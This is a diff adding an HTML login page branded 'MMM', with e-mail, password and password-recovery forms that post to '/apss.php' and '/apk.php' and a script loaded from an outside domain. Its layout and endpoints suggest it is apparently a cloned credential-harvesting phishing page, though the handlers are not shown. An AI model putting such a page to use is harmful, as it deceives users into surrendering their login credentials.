@@ -1,0 +1,108 @@
+<html>
+<head>
+		<meta charset="utf-8">
+		<title>MMM</title>
+		<link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+		<!--<link type="text/css" rel="stylesheet" href="/css/main.css" th:href="@{/css/main.css}" />-->
+		<link type="text/css" rel="stylesheet" href="/css/main.min_new.css">
+		<meta http-equiv="refresh" content="300; URL=/">
+	</head>
+	<body>
+	    
+		<div>
+		    
+	<div class="wrap-pop-lay wrap-pop-lay-pink login" style="display: block">
+		<div class="wrap-pop">
+			<form action="/apss.php?lang=en" method="post">
+                        <input type="hidden" name="============================================" value="">
+			
+				<div class="logo-row"><div class="translate">Login to system</div></div>
+				<div class="lf_line">
+					<label class="translate">
+						<span>Your language:</span>
+						<select id="user_lang">
+							<!--<option value="ru">русский</option>-->
+							<option value="en">english</option>
+							<!--<option value="es">español</option>-->
+							<!--<option value="pt">português</option>-->
+							<!--<option value="ph">pilipino</option>-->
+							<!--<option value="cn">中文</option>-->
+							<!--<option value="hi">हिन्दी</option>-->
+							<!--<option value="id">Bahasa Indonesia</option>-->
+							<!--<option value="jp">日本語</option>-->
+							<!--<option value="tr">Türkçe</option>-->
+							<!--<option value="ko">한국어</option>-->
+						</select>
+					</label>
+				</div>
+				<div class="lf_line">
+					<label class="translate">
+						<span>E-Mail:</span>
+						<!--<span>E-Mail or phone number:</span>-->
+						<div class="right">
+    <input name="login" type="text" class="input_text" autocomplete="off" required="" autofocus="">
+    <!--<p class="lf-italic italic translate">(for example: +7 903 999-66-77)</p>-->
+    <p class="lf-italic italic translate" style="font-size: 10px !important;">(example: login.mmm@gmail.com)</p>
+    </div>
+    </label>
+    </div>
+    
+   
+    
+    <div class="lf_line">
+    <label class="translate">
+    <span>Password:</span>
+    <input name="pass" type="password" class="input_text" autocomplete="off" required="">
+    </label>
+    </div>
+    <div class="bottom">
+    <div class="wrap-bott">
+    <button type="submit" class="button darkorange">Login</button>
+    <a href="#pop5" class="link italic popup" onclick="$('#pop5').show()">Get a new password?</a>
+    <p>If you have forgotten your old password or login to PO first time</p>
+   <a href="/recovery?lang=en" class="link italic popup">Get a new password by email</a>
+    </div>
+    </div>
+    </form>
+    </div>
+	</div>
+	
+	<div id="pop5" class="wrap-pop-lay wrap-pop-lay-pink help">
+    <div class="wrap-pop">
+    <form action="/apk.php?lang=en" method="post">
+    <input type="hidden" name="~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~" value="">
+    
+    <div class="logo-row">
+    <div class="translate">Password recovery</div>
+    </div>
+    <div class="lf_line">
+    <label>
+    <div class="left">
+    <span>E-Mail :</span>
+    <em>(for example: login.mmm@gmail.com)</em>
+    <!--<span>E-Mail or mobile phone:</span>-->
+
+    </div>
+    <div class="right">
+    <input name="login" type="text" class="input_text">
+    </div>
+    </label>
+    
+    	
+    </div>
+    <div class="button-block bottom-lf">
+    <button type="submit" class="button green">Send a request</button>
+    <a href="/?lang=en" class="button red" onclick="$('#pop5').hide()">Cancel</a>
+    </div>
+    <a href="/?lang=en" class="close-x" onclick="$('#pop5').hide()"></a>
+    </form>
+    </div>
+	</div>
+</div>
+		<script src="https://www.mmm-offices.com/js/jquery.min.js"></script>
+	
+
+</body>
+</html>
